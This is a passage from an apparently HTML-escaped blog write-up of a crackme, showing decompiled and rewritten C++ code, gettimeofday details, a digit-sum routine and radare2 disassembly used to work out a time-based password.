+&lt;&#x2F;span&gt;&lt;span&gt;                    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;&#x2F;* WARNING: Subroutine does not return *&#x2F;
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;__stack_chk_fail()&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;  }
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;(ulong)password_is_correct;
+&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;In order to make it more readable I rewrote the whole crackme mainly for presentation purposes.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;cpp&quot; style=&quot;background-color:#282828;color:#fdf4c1aa;&quot; class=&quot;language-cpp &quot;&gt;&lt;code class=&quot;language-cpp&quot; data-lang=&quot;cpp&quot;&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;() {
+&lt;&#x2F;span&gt;&lt;span&gt;    timeval current_time;
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;gettimeofday(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;amp;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;current_time, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;nullptr&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;    ulong seconds &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; current_time.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;tv_sec&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;    ulong microseconds &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; current_time.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;tv_usec&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;    ulong miliseconds &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; seconds &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&#x2F; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;1000.0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span&gt; microseconds &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;1000&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fabd2f;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt; microseconds_digit_sum &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;digit_sum(microseconds)&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fabd2f;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt; password &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; miliseconds &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span&gt;(microseconds_digit_sum &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt; microseconds);
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fabd2f;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt; user_input;
+&lt;&#x2F;span&gt;&lt;span&gt;    
+&lt;&#x2F;span&gt;&lt;span&gt;    std::cout &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;quot;Guess: &amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;    std::cin &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt; user_input;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;bool&lt;&#x2F;span&gt;&lt;span&gt; password_is_correct &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;(password &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;!=&lt;&#x2F;span&gt;&lt;span&gt; user_input);
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(password_is_correct) {
+&lt;&#x2F;span&gt;&lt;span&gt;        std::cout &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;quot;Sorry!&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt; std::endl;
+&lt;&#x2F;span&gt;&lt;span&gt;    } &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;else &lt;&#x2F;span&gt;&lt;span&gt;{
+&lt;&#x2F;span&gt;&lt;span&gt;        std::cout &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;quot;RzAwrCInCg&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt; std::endl;
+&lt;&#x2F;span&gt;&lt;span&gt;    }
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;return&lt;&#x2F;span&gt;&lt;span&gt; password_is_correct;
+&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;The password is based on the time which is returned by gettimeofday function.
+From linux man I got additional info about gettimeofday.&lt;&#x2F;p&gt;
+&lt;p&gt;Function prototypes:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;cpp&quot; style=&quot;background-color:#282828;color:#fdf4c1aa;&quot; class=&quot;language-cpp &quot;&gt;&lt;code class=&quot;language-cpp&quot; data-lang=&quot;cpp&quot;&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;gettimeofday&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;struct&lt;&#x2F;span&gt;&lt;span&gt; timeval &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;tv&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;struct&lt;&#x2F;span&gt;&lt;span&gt; timezone &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;tz&lt;&#x2F;span&gt;&lt;span&gt;);
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;settimeofday&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;const struct&lt;&#x2F;span&gt;&lt;span&gt; timeval &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;tv&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;const struct&lt;&#x2F;span&gt;&lt;span&gt; timezone &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;tz&lt;&#x2F;span&gt;&lt;span&gt;);
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;The function takes two arguments. The first one stores information about time and the second about time zone.
+In this example only the first argument is set, the second one is nullptr.&lt;&#x2F;p&gt;
+&lt;p&gt;timeval type:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;cpp&quot; style=&quot;background-color:#282828;color:#fdf4c1aa;&quot; class=&quot;language-cpp &quot;&gt;&lt;code class=&quot;language-cpp&quot; data-lang=&quot;cpp&quot;&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;struct &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;timeval &lt;&#x2F;span&gt;&lt;span&gt;{
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fabd2f;&quot;&gt;time_t&lt;&#x2F;span&gt;&lt;span&gt;      tv_sec;     &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;&#x2F;* seconds *&#x2F;
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fabd2f;&quot;&gt;suseconds_t&lt;&#x2F;span&gt;&lt;span&gt; tv_usec;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;&#x2F;* microseconds *&#x2F;
+&lt;&#x2F;span&gt;&lt;span&gt;};
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Time is stored in the current_time variable. Seconds (current_time.tv_sec) and microseconds (current_time.tv_usec) are copied to relevant variables.
+After that seconds and microseconds are combined into miliseconds. To do that we multiply seconds by 1000 and then add a number constructed from the first 3 digits of microseconds.&lt;&#x2F;p&gt;
+&lt;p&gt;Example:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;txt&quot; style=&quot;background-color:#282828;color:#fdf4c1aa;&quot; class=&quot;language-txt &quot;&gt;&lt;code class=&quot;language-txt&quot; data-lang=&quot;txt&quot;&gt;&lt;span&gt;seconds: 1594730719
+&lt;&#x2F;span&gt;&lt;span&gt;microseconds: 940827
+&lt;&#x2F;span&gt;&lt;span&gt;miliseconds: 1594730719 * 1000 + 940827&#x2F;1000 = 1594730719000 + 940 = 1594730719940
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Miliseconds are unsigned long type so fractional part is rejected in the final result.&lt;&#x2F;p&gt;
+&lt;p&gt;Next, program calculates microseconds digits sum. It’s achieved by calling digit_sum funtion (orginally named as cross_sum).&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;cpp&quot; style=&quot;background-color:#282828;color:#fdf4c1aa;&quot; class=&quot;language-cpp &quot;&gt;&lt;code class=&quot;language-cpp&quot; data-lang=&quot;cpp&quot;&gt;&lt;span&gt;ulong &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;cross_sum&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;long &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;microseconds&lt;&#x2F;span&gt;&lt;span&gt;)
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;{
+&lt;&#x2F;span&gt;&lt;span&gt;  ulong p1;
+&lt;&#x2F;span&gt;&lt;span&gt;  ulong p2;
+&lt;&#x2F;span&gt;&lt;span&gt;  ulong p3;
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;double&lt;&#x2F;span&gt;&lt;span&gt; ln_microseconds;
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;double&lt;&#x2F;span&gt;&lt;span&gt; ln_10;
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fabd2f;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt; sum;
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt; exponent;
+&lt;&#x2F;span&gt;&lt;span&gt;  
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;log&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;long&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;&amp;gt;(microseconds)&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;log&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;&amp;gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;  sum &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;  exponent &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;while &lt;&#x2F;span&gt;&lt;span&gt;(exponent &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;)(ln_microseconds &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span&gt; ln_10 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;1.00000000&lt;&#x2F;span&gt;&lt;span&gt;)) {
+&lt;&#x2F;span&gt;&lt;span&gt;    p1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;power(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;,exponent)&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;    p2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;power(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;,exponent &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;    p3 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;power(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;,exponent)&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;    sum &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; sum &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;)(((microseconds &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt; microseconds &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;long&lt;&#x2F;span&gt;&lt;span&gt;)(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;)p1) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;long&lt;&#x2F;span&gt;&lt;span&gt;)(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;)p2) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&#x2F;
+&lt;&#x2F;span&gt;&lt;span&gt;                     (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;long&lt;&#x2F;span&gt;&lt;span&gt;)(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;)p3);
+&lt;&#x2F;span&gt;&lt;span&gt;    exponent &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; exponent &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;  }
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;(ulong)sum;
+&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;“While loop” proceedes until an exponent is lower than the number of all digits in microseconds.&lt;&#x2F;p&gt;
+&lt;p&gt;Example:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#282828;color:#fdf4c1aa;&quot;&gt;&lt;code&gt;&lt;span&gt;microseconds: 940827
+&lt;&#x2F;span&gt;&lt;span&gt;exponent: 0
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;while (exponent &amp;lt; 6) {
+&lt;&#x2F;span&gt;&lt;span&gt;    ...
+&lt;&#x2F;span&gt;&lt;span&gt;    ...
+&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Function adds all digits from microseconds without the last one. When I tried to calculate the sum value, my result did not match the result given by the program.
+I was surprised and rerun program in debugger in order to check what is going on. Once more I was surprised when I saw power(10, 0) = 10. I checked assembly code of power function and
+everything became clear.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;nasm&quot; style=&quot;background-color:#282828;color:#fdf4c1aa;&quot; class=&quot;language-nasm &quot;&gt;&lt;code class=&quot;language-nasm&quot; data-lang=&quot;nasm&quot;&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;┌ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;52&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;: sym.p_int__int (int64_t arg1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;int64_t arg2)&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;│&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;           ; var int64_t exponent @ rbp-0x18
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;│&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;           ; var int64_t base @ rbp-0x14
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;│&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;           ; var int64_t result @ rbp-0x8
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;│&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;           ; var int64_t var_4h @ rbp-0x4
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;│&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;           ; arg int64_t arg1 @ rdi
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;│&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;           ; arg int64_t arg2 @ rsi
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;│           &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;push &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;rbp                    
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;│           &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;mov &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;rbp, rsp
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;│           &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;mov &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fabd2f;&quot;&gt;dword &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;base&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;], edi&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;       ; arg1
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;│           &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;mov &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fabd2f;&quot;&gt;dword &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;exponent&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;], esi&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;   ; arg2
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;│           &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;mov &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;eax, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fabd2f;&quot;&gt;dword &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;base&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;]
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;│           &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;mov &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fabd2f;&quot;&gt;dword &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;result&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;], eax
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;│           &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;mov &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fabd2f;&quot;&gt;dword &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;var_4h&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;], &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;1
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;│           
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;│       ┌─&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;mov &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;eax, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fabd2f;&quot;&gt;dword &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;var_4h&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;]
